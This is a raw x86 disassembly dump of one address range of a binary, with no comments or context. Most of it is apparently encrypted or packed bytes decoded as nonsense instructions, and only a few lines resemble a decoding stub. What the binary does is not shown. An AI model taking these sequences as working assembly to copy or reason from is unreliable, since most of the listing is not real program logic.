  416877:	jge    0x416878
  416879:	push   es
  41687a:	pop    es
  41687b:	pop    esp
  41687c:	adc    DWORD PTR [esi+0x66c19b17],0x6632ac01
  416886:	adc    dh,BYTE PTR [esi+0x77b42537]
  41688c:	ror    edi,1
  41688e:	daa    
  41688f:	adc    BYTE PTR [eax-0x8a32a6f],dl
  416895:	mov    esp,DWORD PTR [eax+0x3459da7d]
  41689b:	jnp    0x416893
  41689d:	aas    
  41689e:	xchg   edi,eax
  41689f:	sbb    DWORD PTR [ebp+edx*4+0x49b6e0a8],esi
  4168a6:	(bad)  
  4168a7:	xchg   edi,eax
  4168a8:	push   ss
  4168a9:	je     0x416879
  4168ab:	push   ebx
  4168ac:	or     al,ch
  4168ae:	jnp    0x416888
  4168b0:	rol    BYTE PTR [edi],cl
  4168b2:	sub    BYTE PTR [ebx-0x72],ah
  4168b5:	jbe    0x41688a
  4168b7:	(bad)  
  4168b8:	mov    ch,0x53
  4168ba:	std    
  4168bb:	test   al,0xf
  4168bd:	mov    edx,DWORD PTR ds:0xcadd27a8
  4168c3:	addr16 enter 0x2335,0x30
  4168c8:	inc    esi
  4168c9:	icebp  
  4168ca:	sub    BYTE PTR [eax+0x5612d04c],0x55
  4168d1:	and    eax,0x7d5c12fe
  4168d6:	mov    ebx,0x47294a6e
  4168db:	dec    ebx
  4168dc:	clc    
  4168dd:	shl    BYTE PTR [edi+0x1d899ce5],0x77
  4168e4:	std    
  4168e5:	xchg   esi,eax
  4168e6:	(bad)  
  4168e7:	xor    al,0xc9
  4168e9:	sbb    bl,BYTE PTR [ecx-0x40a8356b]
  4168ef:	fist   DWORD PTR [edi+ecx*4+0x7]
  4168f3:	jae    0x416939
  4168f5:	xor    al,0x3d
  4168f7:	jbe    0x416933
  4168f9:	mov    DWORD PTR [esp+eax*2-0x1e],esi
  4168fd:	repnz aam 0x17
  416900:	scas   eax,DWORD PTR es:[edi]
  416901:	mov    dl,0xe3
  416903:	mov    ?,WORD PTR [esp+ebx*4+0x6010992e]
  41690a:	xchg   ebp,eax
  41690b:	out    dx,al
  41690c:	push   edx
  41690d:	mov    ebx,0x8ea1a9ae
  416912:	jbe    0x41694a
  416914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416915:	mov    edi,0x10c5aebd
  41691a:	inc    eax
  41691b:	jp     0x4168cd
  41691d:	or     al,0x5f
  41691f:	test   BYTE PTR ds:0x755e6a44,0x2d
  416926:	pop    esp
  416927:	aam    0x12
  416929:	adc    eax,0x16cdd5ea
  41692e:	xor    eax,0x335c848c
  416933:	xor    BYTE PTR [edi-0x15],0x66
  416937:	xchg   ecx,eax
  416938:	jo     0x416982
  41693a:	stos   DWORD PTR es:[di],eax
  41693c:	(bad)  [edx]
  41693e:	fst    DWORD PTR [ebp-0x7e]
  416941:	xchg   DWORD PTR [esi+0x220382d0],esi
  416947:	and    eax,0x96f37a6f
  41694c:	add    al,0x29
  41694e:	pop    edx
  41694f:	jns    0x416939
  416951:	mov    cl,0xaa
  416953:	jge    0x41691e
  416955:	lods   eax,DWORD PTR ds:[esi]
  416956:	and    BYTE PTR [edx-0x14],0xf7
  41695a:	mov    DWORD PTR [eax],ebx
  41695c:	add    eax,0x579b1e27
  416961:	sbb    al,0x20
  416963:	fild   DWORD PTR [esi-0x4d79a4d8]
  416969:	pop    es
  41696a:	mov    ebp,0xb108fb65
  41696f:	inc    edx
  416970:	imul   ebx,esp,0x47de19c2
  416976:	jmp    0x416905
  416978:	add    eax,0xfa569324
  41697d:	fcomp  QWORD PTR [edx-0x62]
  416980:	out    dx,eax
  416981:	clc    
  416982:	mov    edi,ecx
  416984:	in     eax,0x28
  416986:	cmp    bl,BYTE PTR [eax]
  416988:	gs push 0x399381fc
  41698e:	mov    eax,ds:0x44ed41fa
  416993:	fwait
  416994:	dec    ebx
  416995:	aaa    
  416996:	xor    ch,0x51
  416999:	adc    al,0xb
  41699b:	leave  
  41699c:	dec    esi
  41699d:	and    BYTE PTR [ebp-0x1b],dl
  4169a0:	ret    
  4169a1:	push   edi
  4169a2:	dec    edx
  4169a3:	fwait
  4169a4:	loop   0x416990
  4169a6:	pop    eax
  4169a7:	aaa    
  4169a8:	add    ah,ch
  4169aa:	iret   
  4169ab:	fld    QWORD PTR [edi]
  4169ad:	pusha  
  4169ae:	lea    esi,[esi+0xf]
  4169b1:	and    BYTE PTR [esi+0x59],0xd2
  4169b5:	mov    BYTE PTR [edi+0x2ba9558d],0x4a
  4169bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169bd:	or     BYTE PTR [ebp-0xd327255],ah
  4169c3:	xor    eax,0xbff98f6d
  4169c8:	jmp    0xb4a9c3a3
  4169cd:	call   0x3ead:0x702460eb
  4169d4:	(bad)  
  4169d6:	test   DWORD PTR [eax+0x37],edx
  4169d9:	cli    
  4169da:	cmp    eax,0x2993c4d
  4169df:	jb     0x4169ac
  4169e1:	pop    eax
  4169e2:	jl     0x416a23
  4169e4:	or     al,BYTE PTR [edi]
  4169e6:	sub    DWORD PTR [ebp-0x1a],edx
  4169e9:	xor    DWORD PTR [esi+eax*4-0x7c],eax
  4169ed:	into   
  4169ee:	or     bl,BYTE PTR ds:0xf2c814af
  4169f4:	inc    esp
  4169f5:	adc    eax,0x14cac16b
  4169fa:	les    ebx,FWORD PTR fs:[edx+0xd8473ce]
  416a01:	test   BYTE PTR [ebp+0x9],bh
  416a04:	ret    0xee96
  416a07:	and    BYTE PTR [ebx-0x26afc02f],ch
  416a0d:	(bad)  
  416a0e:	fsubr  st(4),st
  416a10:	test   al,0x0
  416a12:	xchg   BYTE PTR [esi+ebp*1-0x30dc09f4],bh
  416a19:	ja     0x416a8a
  416a1b:	out    dx,eax
  416a1c:	sub    al,0xb4
  416a1e:	mov    bl,0x20
  416a20:	xor    al,0xb2
  416a22:	sub    eax,0x8ce06282
  416a27:	loop   0x4169af
  416a29:	gs xchg esp,eax
  416a2b:	std    
  416a2c:	xchg   DWORD PTR [ebx],ebp
  416a2e:	inc    edx
  416a2f:	in     eax,0x5d
  416a31:	rcr    DWORD PTR [ebx+0x3d],0x9e
  416a35:	es sbb al,0x58
  416a38:	push   ebp
  416a39:	(bad)  
  416a3b:	arpl   WORD PTR [edi],sp
  416a3d:	stos   DWORD PTR es:[edi],eax
  416a3e:	pop    esp
  416a3f:	push   cs
  416a40:	mov    edi,0x79717381
  416a45:	jo     0x416a14
  416a47:	pop    eax
  416a48:	shr    BYTE PTR [ebx-0x24eccc5c],0xd7
  416a4f:	adc    BYTE PTR [ebp-0x1801a177],dh
  416a55:	pop    DWORD PTR [edx+0x72]
  416a58:	outs   dx,DWORD PTR ds:[esi]
  416a59:	push   ecx
  416a5a:	push   ds
  416a5b:	jae    0x416a2c
  416a5d:	es xchg ecx,eax
  416a5f:	aam    0xd
  416a61:	xor    eax,0xf8240fed
  416a66:	mov    ds:0x6659acc9,al
  416a6b:	call   ecx
  416a6d:	xchg   esi,eax
  416a6e:	xor    eax,0xbc042066
  416a73:	inc    ebp
  416a74:	nop
  416a75:	mov    cl,0x54
  416a77:	retf   0x62d5
  416a7a:	int    0x37
  416a7c:	fld    QWORD PTR [ebx+0x1bdb09e2]
  416a82:	into   
  416a83:	cmp    dl,BYTE PTR [ebx+eiz*8+0x25]
  416a87:	jnp    0x416a59
  416a89:	in     al,dx
  416a8a:	cmp    al,dh
  416a8c:	push   0x63
  416a8e:	shl    DWORD PTR [edx+0x7c],0xc1
  416a92:	cwde   
  416a93:	push   ecx
  416a94:	mov    al,ds:0x1a1e1441
  416a99:	imul   esp,DWORD PTR [edx-0x5c],0xbde5ca60
  416aa0:	mov    ds:0xa6d706d1,al
  416aa5:	enter  0x15f9,0x7e
  416aa9:	sub    ah,ch
  416aab:	jl     0x416af7
  416aad:	mov    eax,ds:0x1047cd17
  416ab2:	dec    esp
  416ab3:	mov    bl,0xa1
  416ab5:	sbb    cl,BYTE PTR [ebx+0x5f]
  416ab8:	mov    bl,0x9d
  416aba:	pop    ecx
  416abb:	arpl   dx,dx
  416abd:	out    dx,al
  416abe:	or     BYTE PTR [ebx-0x4c1603bb],cl
  416ac4:	add    al,BYTE PTR [eax]
  416ac6:	add    al,dl
  416ac8:	ret    0xcfc4
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0x7764ff75
  416ad4:	js     0x416aee
  416ad6:	mov    bh,0x93
  416ad8:	and    BYTE PTR [edi+0x78],bh
  416adb:	xchg   ebp,eax
  416adc:	jle    0x416b56
  416ade:	js     0x416b1c
  416ae0:	out    0x55,eax
  416ae2:	ror    esi,1
  416ae4:	xchg   esp,eax
  416ae5:	outs   dx,DWORD PTR ds:[esi]
  416ae6:	mov    BYTE PTR [ecx],bl
  416ae8:	sub    al,0x62
  416aea:	sub    dh,0xdd
  416aed:	loop   0x416b69
  416aef:	in     al,0x10
  416af1:	jmp    0x6ee7:0xc5941810
  416af8:	lea    ebp,[ebp+0x54]
  416afb:	xor    al,0xa8
  416afd:	inc    edx
  416afe:	cs inc eax
  416b00:	mov    edi,0x70459678
  416b05:	push   ss
  416b06:	sti    
  416b07:	lods   eax,DWORD PTR ds:[esi]
  416b08:	addr16 mov edi,0xe86abf1a
  416b0e:	or     al,0x3d
  416b10:	jecxz  0x416b06
  416b12:	cmc    
  416b13:	jmp    0x416aae
  416b15:	sub    bl,BYTE PTR [ecx-0x5765fea7]
  416b1b:	jae    0x416a9f
  416b1d:	pop    eax
  416b1e:	xchg   edx,eax
  416b1f:	outs   dx,DWORD PTR ds:[esi]
  416b20:	dec    edx
  416b21:	sbb    BYTE PTR [ebx+ebp*2-0x55],ch
  416b25:	mov    ebp,0x8b41de42
  416b2a:	pavgb  mm6,mm6
  416b2d:	fs mov bh,0x7d
  416b30:	ins    DWORD PTR es:[edi],dx
  416b31:	adc    ch,BYTE PTR ds:0x72eeb525
  416b37:	lock out 0xf7,eax
  416b3a:	das    
  416b3b:	inc    esp
  416b3c:	jmp    0x91fb9fd8
  416b41:	daa    
  416b42:	aam    0x12
  416b44:	xchg   BYTE PTR [ebx+0x59],dh
  416b47:	ficomp DWORD PTR [edi+edx*2-0x26c82e02]
  416b4e:	test   al,0x96
  416b50:	dec    ebp
  416b51:	arpl   WORD PTR [edi],bp
  416b53:	js     0x416b8d
  416b55:	adc    ebp,0xfffffff9
  416b58:	or     ebp,DWORD PTR [esp+ecx*1-0x34]
  416b5c:	test   ch,0x36
  416b5f:	mov    al,ds:0x77ed9272
  416b64:	push   cs
  416b65:	pop    esi
  416b66:	sub    ah,ah
  416b68:	xlat   BYTE PTR ds:[ebx]
  416b69:	stos   DWORD PTR es:[edi],eax
  416b6a:	fdivp  st(7),st
  416b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b6d:	daa    
  416b6e:	popf   
  416b6f:	lods   al,BYTE PTR ds:[esi]
  416b70:	cwde   
  416b71:	fistp  QWORD PTR [edi+0x79]
  416b74:	fimul  WORD PTR [eax+0x5c15bee0]
  416b7a:	push   0x99a100b0
  416b7f:	mov    edi,esi
  416b81:	xchg   BYTE PTR [eax],dl
  416b83:	inc    eax
  416b84:	and    cl,BYTE PTR [ecx+0x7b9a2b5c]
  416b8a:	jmp    FWORD PTR [ebp-0x6497ae89]
  416b90:	pop    ds
  416b91:	call   0xfed34c59
  416b96:	retf   0xe694
  416b99:	icebp  
  416b9a:	leave  
  416b9b:	mov    ds:0x5803065,al
  416ba0:	fstp   DWORD PTR [edi-0x19fa00f1]
  416ba6:	add    BYTE PTR [esi+0x1e176541],0x2a
  416bad:	push   0xc971c0b0
  416bb2:	cmp    ebx,DWORD PTR [ebp+ebp*8-0x29148b2b]
  416bb9:	in     al,0x56
  416bbb:	mov    dl,0x82
  416bbd:	ret    
  416bbe:	add    edi,DWORD PTR [ecx-0x5a6cd64a]
  416bc4:	lock clc 
  416bc6:	jnp    0x416c22
  416bc8:	jmp    0xba91d4e1
  416bcd:	xor    eax,0x5c72bc47
  416bd2:	ret    0x35b9
  416bd5:	rcr    DWORD PTR [edx*8-0x14b52aa3],0xfb
  416bdd:	jae    0x416ba7
  416bdf:	and    eax,0xcc92298f
  416be4:	mov    ah,BYTE PTR [edx+0x1b]
  416be7:	jno    0x416bc4
  416be9:	and    edi,ebx
  416beb:	rcl    DWORD PTR [ebx],cl
  416bed:	mov    al,0x99
  416bef:	adc    DWORD PTR [edi-0xa856798],ecx
  416bf5:	hlt    
  416bf6:	mov    ecx,0xc5c3ab56
  416bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bfc:	mov    al,ch
  416bfe:	push   es
  416bff:	lar    ebp,WORD PTR [esi-0x561c4e6a]
  416c06:	fdiv   DWORD PTR fs:[esi+0x7d]
  416c0a:	jns    0x416c2b
  416c0c:	push   edx
  416c0d:	inc    ebx
  416c0e:	add    BYTE PTR [eax+0xe],dh
  416c11:	fsubr  DWORD PTR [eax+esi*2]
  416c14:	xchg   ebp,eax
  416c15:	push   ds
  416c16:	inc    esp
  416c17:	mov    edi,0x27049991
  416c1c:	out    dx,eax
  416c1d:	clc    
  416c1e:	xor    ebp,ebp
  416c20:	xor    eax,DWORD PTR [edx+0x4e]
  416c23:	xchg   edi,eax
  416c24:	dec    ebp
  416c25:	cs cli 
  416c27:	xchg   ebx,eax
  416c28:	jbe    0x416ca1
  416c2a:	inc    edi
  416c2b:	xchg   ecx,eax
  416c2c:	cwde   
  416c2d:	dec    ebp
  416c2e:	scas   al,BYTE PTR es:[edi]
  416c2f:	dec    ebp
  416c30:	push   ds
  416c31:	sub    eax,DWORD PTR [ecx-0x643d7a1e]
  416c37:	sbb    esi,ecx
  416c39:	das    
  416c3a:	jl     0x416c97
  416c3c:	and    DWORD PTR [ecx],0x7e
  416c3f:	lock sbb BYTE PTR [ebx-0x64],ch
  416c43:	lock sub BYTE PTR [ebp-0x3b],cl
  416c47:	jbe    0x416c4b
  416c49:	pop    ebp
  416c4a:	jg     0x416c62
  416c4c:	add    dl,BYTE PTR [edx]
  416c4e:	jno    0x416c43
  416c50:	push   ebx
  416c51:	jl     0x416bf2
  416c53:	imul   edx,DWORD PTR [esi],0x312c65dd
  416c59:	mov    edi,0xc7214f9f
  416c5e:	xor    bl,BYTE PTR [edx-0x63]
  416c61:	dec    eax
  416c62:	push   0x2d
  416c64:	fs xchg esp,eax
  416c66:	mov    edx,0x79823706
  416c6b:	nop
  416c6c:	mov    edi,0x80b18498
  416c71:	cmp    BYTE PTR [ebx+0x23],ch
  416c74:	cmp    bl,BYTE PTR [ebx-0x7774bb76]
  416c7a:	sbb    eax,0x1f091898
  416c7f:	inc    esi
  416c80:	or     esi,edx
  416c82:	cmp    BYTE PTR [eax],ah
  416c84:	(bad)  
  416c85:	hlt    
  416c86:	dec    ebp
  416c87:	mov    ds:0x89054194,al
  416c8c:	(bad)  
  416c8d:	fiadd  DWORD PTR [ecx+0x1f]
  416c90:	stos   DWORD PTR es:[edi],eax
  416c91:	dec    esi
  416c92:	nop
  416c93:	push   edx
  416c94:	das    
  416c95:	xor    bl,BYTE PTR [ebx+edx*8+0x1441e963]
  416c9c:	and    ebx,ecx
  416c9e:	adc    eax,0x6f4e5115
  416ca3:	jp     0x416c29
  416ca5:	ret    
  416ca6:	div    BYTE PTR [esi-0x7de5e4e3]
  416cac:	pop    edx
  416cad:	cld    
  416cae:	ins    BYTE PTR es:[edi],dx
  416caf:	ss into 
  416cb1:	adc    al,0xcf
  416cb3:	dec    edi
  416cb4:	pop    eax
  416cb5:	shl    BYTE PTR [esi-0x2d],cl
  416cb8:	(bad)  
  416cba:	hlt    
  416cbb:	enter  0xb200,0x27
  416cbf:	push   edi
  416cc0:	or     eax,0x7190370d
  416cc5:	lahf   
  416cc6:	mov    DWORD PTR [esi+0x31],ebp
  416cc9:	hlt    
  416cca:	fistp  WORD PTR [edi-0x4bae3c83]
  416cd0:	jnp    0x416d39
  416cd2:	scas   eax,DWORD PTR es:[edi]
  416cd3:	outs   dx,DWORD PTR ds:[esi]
  416cd4:	pop    edx
  416cd5:	xor    al,0x56
  416cd7:	xchg   edx,eax
  416cd8:	inc    edi
  416cd9:	xchg   ebx,eax
  416cda:	cmp    eax,0xc7b9e685
  416cdf:	jmp    0x48f72d4a
  416ce4:	mov    ebx,DWORD PTR [edi+ebp*8+0x206da44c]
  416ceb:	add    al,0x9f
  416ced:	fsubr  st,st(3)
  416cef:	sub    eax,0x8b7a6f28
  416cf4:	mov    ds:0xaa2ca527,eax
  416cf9:	(bad)  
  416cfa:	aaa    
  416cfb:	icebp  
  416cfc:	test   BYTE PTR [eax+0x1c],al
  416cff:	and    bh,cl
  416d01:	inc    esp
  416d02:	cmp    ah,cl
  416d04:	xor    bl,BYTE PTR [ebp+0x4b8c1e84]
  416d0a:	lock mov al,0x12
  416d0d:	fcmove st,st(6)
  416d0f:	in     al,0xff
  416d11:	repnz ins BYTE PTR es:[edi],dx
  416d13:	dec    ebx
  416d14:	inc    ecx
  416d15:	retf   0xe14a
  416d18:	sub    ebp,edi
  416d1a:	jg     0x416d2f
  416d1c:	fistp  QWORD PTR [edi-0x1f]
  416d1f:	jmp    0x1a7d:0x3ca4883
  416d26:	pop    es
  416d27:	mov    ah,0x26
  416d29:	sub    ah,BYTE PTR [edi]
  416d2b:	jne    0x416d4c
  416d2d:	add    edi,DWORD PTR [ecx]
  416d2f:	in     eax,0xdb
  416d31:	enter  0x7a3e,0xf7
  416d35:	xchg   ebx,eax
  416d36:	mov    ah,0xdd
  416d38:	out    dx,eax
  416d39:	cmc    
  416d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d3b:	imul   esp,ecx,0x43
  416d3e:	into   
  416d3f:	pop    eax
  416d40:	xchg   esi,eax
  416d41:	jmp    0xdf8b6699
  416d46:	repz cwde 
  416d48:	pop    edx
  416d49:	or     BYTE PTR [ecx-0x4a780f5b],0x5f
  416d50:	and    BYTE PTR [ecx-0x586c86e4],bl
  416d56:	rol    cl,0x3e
  416d59:	pusha  
  416d5a:	adc    BYTE PTR [ebp+0x77403908],bl
  416d60:	bswap  eax
  416d62:	push   edx
  416d63:	cdq    
  416d64:	add    al,BYTE PTR ds:0xaf1bb380
  416d6a:	and    edi,DWORD PTR [esp+edx*1-0x6cf65099]
  416d71:	mov    edx,0xe0fbed07
  416d76:	xchg   ecx,eax
  416d77:	or     bl,bl
  416d79:	jnp    0xc7747dcc
  416d7f:	add    eax,esi
  416d81:	cmp    eax,ecx
  416d83:	jne    0x41731c
  416d89:	mov    eax,DWORD PTR [ebp-0x4]
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0xbf8a:0x51e71efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	dec    ecx
  416db8:	stos   BYTE PTR es:[edi],al
  416db9:	out    dx,eax
  416dba:	(bad)  
  416dbb:	mov    dl,0x98
  416dbd:	xor    al,0xdb
  416dbf:	xor    DWORD PTR [ecx+0x5ad393ff],eax
  416dc5:	xor    esi,DWORD PTR [ebx]
  416dc7:	fwait
  416dc8:	sub    DWORD PTR [ecx-0x23],eax
  416dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dcc:	xchg   edi,eax
  416dcd:	sbb    eax,0xa95efec1
  416dd2:	and    eax,0x2e56063c
  416dd7:	mov    edx,0x4e66cf8f
  416ddc:	add    BYTE PTR [esi+esi*1+0x63],ch
  416de0:	xor    al,0xc9
  416de2:	mov    al,ds:0xd604c962
  416de7:	xlat   BYTE PTR ds:[ebx]
  416de8:	jae    0x416e28
  416dea:	mov    ds:0x24eeb30c,eax
  416def:	fcomp  DWORD PTR [eax]
  416df1:	fdiv   DWORD PTR [ebp+0x732f31ae]
  416df7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416df8:	add    bl,cl
  416dfa:	(bad)  
  416dfb:	sbb    DWORD PTR [ebp-0x43],ecx
  416dfe:	xchg   BYTE PTR [ebp+edx*8-0x5c966c82],bl
  416e05:	les    esp,FWORD PTR [edx]
  416e07:	jmp    0xe62ed388
  416e0c:	mov    ch,0xae
  416e0e:	shr    DWORD PTR [edx+0x64ca3133],1
  416e14:	aad    0xd3
  416e16:	sub    al,0x97
  416e18:	sub    al,0x77
  416e1a:	sbb    ecx,DWORD PTR [ecx+0x65]
  416e1d:	sbb    al,0x11
  416e1f:	or     al,0x28
  416e21:	xchg   esp,eax
  416e22:	or     DWORD PTR [edi-0x279bd746],ebx
  416e28:	retf   0x20c0
  416e2b:	sar    dl,1
  416e2d:	adc    DWORD PTR [ebx-0x1c63af0a],0x38
  416e34:	and    dh,BYTE PTR [edi]
  416e36:	std    
  416e37:	mov    ah,0xcb
  416e39:	outs   dx,DWORD PTR ds:[esi]
  416e3a:	cmp    eax,eax
  416e3c:	xchg   esi,eax
  416e3d:	dec    edi
  416e3e:	adc    BYTE PTR [esi+0x5e],bh
  416e41:	mov    edx,0x53ecd767
  416e46:	inc    esp
  416e47:	imul   eax,DWORD PTR [edx-0x70938bd2],0x20c87b13
  416e51:	mov    esp,0x6c61d214
  416e56:	jecxz  0x416e66
  416e58:	jae    0x416e8c
  416e5a:	dec    ebp
  416e5b:	(bad)  
  416e5c:	fdivr  DWORD PTR [ebx+0x3a710c4e]
  416e62:	inc    esi
  416e63:	and    ah,BYTE PTR [edx-0x5e450a5a]
  416e69:	data16 and al,0xe5
  416e6c:	enter  0x3a11,0xa7
  416e70:	sub    DWORD PTR [edi+0x64033462],edx
  416e76:	pushf  
  416e77:	stc    
  416e78:	(bad)  [edi]
  416e7a:	or     al,0xfb
  416e7d:	(bad)  
  416e7e:	cmp    ch,ah
  416e80:	ds ds pop es
  416e83:	daa    
  416e84:	loopne 0x416ee4
  416e86:	(bad)  
  416e87:	(bad)  
  416e88:	bound  edx,QWORD PTR [edi+0x66242cab]
  416e8e:	lds    esp,FWORD PTR [edi+eax*1-0x2b]
  416e92:	cdq    
  416e93:	das    
  416e94:	mov    al,ds:0xcedc99b1
  416e99:	hlt    
  416e9a:	cwde   
  416e9b:	inc    eax
  416e9c:	dec    esi
  416e9e:	and    esp,ebx
  416ea0:	outs   dx,DWORD PTR ds:[esi]
  416ea1:	xchg   edi,eax
  416ea2:	xor    bh,BYTE PTR [ebx+eiz*8+0x70bff774]
  416ea9:	jmp    0xed27:0xf36d7ca2
  416eb0:	inc    ebp
  416eb1:	ret    
  416eb2:	aas    
  416eb3:	loop   0x416e52
  416eb5:	xchg   edx,eax
  416eb6:	xchg   esp,eax
  416eb7:	cmp    bh,BYTE PTR [esp+eiz*2]
  416eba:	shl    DWORD PTR [ebp+eax*1-0x40a5eaaf],0x79
  416ec2:	pop    ecx
  416ec3:	xor    al,0xad
  416ec5:	pusha  
  416ec6:	xchg   ecx,eax
  416ec7:	or     eax,0x70e15775
  416ecc:	mov    ah,0x2e
  416ece:	jae    0x416eba
  416ed0:	xor    esp,edx
  416ed2:	mov    cl,BYTE PTR [edi]
  416ed4:	mov    edi,0x27d99760
  416ed9:	aad    0x26
  416edb:	call   0x6be3:0xbd522ea0
  416ee2:	mov    cl,0xfc
  416ee4:	les    ecx,FWORD PTR [ebp-0x7d]
  416ee7:	nop
  416ee8:	xor    dh,BYTE PTR [ebp+ecx*2-0x4d296473]
  416eef:	retf   0x9acf
  416ef2:	cmp    edx,DWORD PTR [edx-0x19]
  416ef5:	mov    ch,0x4f
  416ef7:	dec    ebp
  416ef8:	and    BYTE PTR [ecx+0x5f87d684],ah
  416efe:	push   esp
  416eff:	dec    eax
  416f00:	or     al,0x54
  416f02:	mov    bl,0x32
  416f04:	add    DWORD PTR [esi-0x5e2b2b27],edi
  416f0a:	les    ecx,FWORD PTR [eax]
  416f0c:	inc    eax
  416f0d:	pop    ebx
  416f0e:	push   ecx
  416f0f:	add    DWORD PTR [ecx-0xf],esp
  416f12:	dec    eax
  416f13:	adc    dl,BYTE PTR [ebp-0x5d]
  416f16:	fidiv  WORD PTR [ecx+ebp*2-0x76c2482d]
  416f1d:	sbb    al,0x51
  416f1f:	mov    ebx,0xce50c698
  416f24:	ins    DWORD PTR es:[edi],dx
  416f25:	jns    0x416ef5
  416f27:	test   DWORD PTR [esi+0x1b],edx
  416f2a:	out    0x1f,eax
  416f2c:	retf   
  416f2d:	push   0x24
  416f2f:	sub    al,0x37
  416f31:	mov    ds:0xb9538fc1,eax
  416f36:	push   cs
  416f37:	mov    bl,0x53
  416f39:	pop    ss
  416f3a:	fsqrt  
  416f3c:	inc    eax
  416f3d:	retf   
  416f3e:	inc    ebx
  416f3f:	aaa    
  416f40:	div    DWORD PTR [edx+0x5c8d8c98]
  416f46:	and    dh,BYTE PTR [ebx+eiz*8-0x7d]
  416f4a:	inc    ebx
  416f4b:	pop    edx
  416f4c:	jmp    edx
  416f4e:	jmp    0x7c3f:0xe459ce8b
  416f55:	mov    ss,WORD PTR [edx-0x78]
  416f58:	sub    eax,0xcce90fd0
  416f5d:	cld    
  416f5e:	popf   
  416f5f:	aas    
  416f60:	std    
  416f61:	lods   al,BYTE PTR ds:[esi]
  416f62:	or     eax,0x435169bf
  416f67:	push   ebp
  416f68:	outs   dx,DWORD PTR ds:[esi]
  416f69:	dec    edi
  416f6a:	mov    al,ds:0xb2f5435d
  416f6f:	fsub   st,st(1)
  416f71:	ret    0x83fd
  416f74:	in     eax,dx
  416f75:	retf   0xf5bd
  416f78:	dec    edx
  416f79:	adc    ebx,DWORD PTR [ebx+edi*4]
  416f7c:	xchg   ebx,eax
  416f7d:	ins    BYTE PTR es:[edi],dx
  416f7e:	scas   eax,DWORD PTR es:[edi]
  416f7f:	test   DWORD PTR [ebx-0xc3377f1],0x430be172
  416f89:	fimul  WORD PTR [ecx]
  416f8b:	push   0xfffffff0
  416f8d:	mov    ss,eax
  416f8f:	or     ecx,ebx
  416f91:	fwait
  416f92:	std    
  416f93:	add    al,0x1c
  416f95:	cwde   
  416f96:	daa    
  416f97:	mov    edx,0x986bea13
  416f9c:	xlat   BYTE PTR gs:[ebx]
  416f9e:	out    dx,eax
  416f9f:	push   esp
  416fa0:	sbb    eax,DWORD PTR [ebx-0x62]
  416fa3:	push   0x1
  416fa5:	sti    
  416fa6:	lahf   
  416fa7:	fwait
  416fa8:	dec    DWORD PTR [ebx-0x55]
  416fab:	add    al,0x38
  416fad:	icebp  
  416fae:	cmp    al,0x40
  416fb0:	test   BYTE PTR [ebp+0x1517b0fa],al
  416fb6:	cmc    
  416fb7:	sahf   
  416fb8:	push   edx
  416fb9:	pop    esi
  416fba:	cmp    DWORD PTR [ecx-0x78],ebx
  416fbd:	scas   al,BYTE PTR es:[edi]
  416fbe:	sub    dh,BYTE PTR [edx+eax*1-0x75f9984e]
  416fc5:	pop    esi
  416fc6:	test   DWORD PTR [ebp+esi*2-0x47a42b14],0x5875fb19
  416fd1:	call   0x4c13:0xf0e1c1c1
  416fd8:	dec    edi
  416fd9:	add    ah,ch
  416fdb:	stos   BYTE PTR es:[edi],al
  416fdc:	leave  
  416fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fde:	cmp    edx,DWORD PTR [ebx+0x31]
  416fe1:	jns    0x416fd9
  416fe3:	xor    al,0xc
  416fe5:	fwait
  416fe6:	lock int3 
  416fe8:	mov    bh,ah
  416fea:	xchg   BYTE PTR [ebp-0x30],bh
  416fed:	adc    BYTE PTR [ebp+0x1d],0xef
  416ff1:	xchg   edx,eax
  416ff2:	jne    0x416fb1
  416ff4:	push   ecx
  416ff5:	mov    edx,0xce5eb862
  416ffa:	mov    ds:0xae529534,eax
  416fff:	mov    bl,0xa
  417001:	aam    0x99
  417003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417004:	arpl   bp,di
  417006:	sbb    al,0xfa
  417008:	(bad)
  41700d:	inc    esp
  41700e:	push   ds
  41700f:	test   eax,0x4c1142af
  417014:	jp     0x417087
  417016:	pop    ebp
  417017:	dec    eax
  417018:	jmp    ebp
  41701a:	rcr    DWORD PTR [edx+0x73e09a7c],1
  417020:	mov    ecx,0xea3a1e46
  417025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417026:	in     eax,0x13
  417028:	sub    ch,al
  41702a:	in     eax,dx
  41702b:	pop    edi
  41702c:	pop    ds
  41702d:	outs   dx,BYTE PTR ds:[esi]
  41702e:	rol    ebx,1
  417030:	fcomp  DWORD PTR [ecx-0x765aa785]
  417036:	inc    ebx
  417037:	mov    BYTE PTR [edx+0x26edd96a],al
  41703d:	push   ecx
  41703e:	sub    DWORD PTR [ebx-0x55],ebp
  417041:	jae    0x417005
  417043:	mov    dl,0x7c
  417045:	pop    edx
  417046:	jmp    0x7c30:0x9482ed18
  41704d:	push   0xffffffb2
  41704f:	cmp    eax,0xc603b960
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi-0x7ed9bb45],edx
  41706d:	cmp    eax,0x787f2b45
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x416fff
  417077:	stc    
  417078:	and    BYTE PTR [ecx],ch
  41707a:	dec    ebx
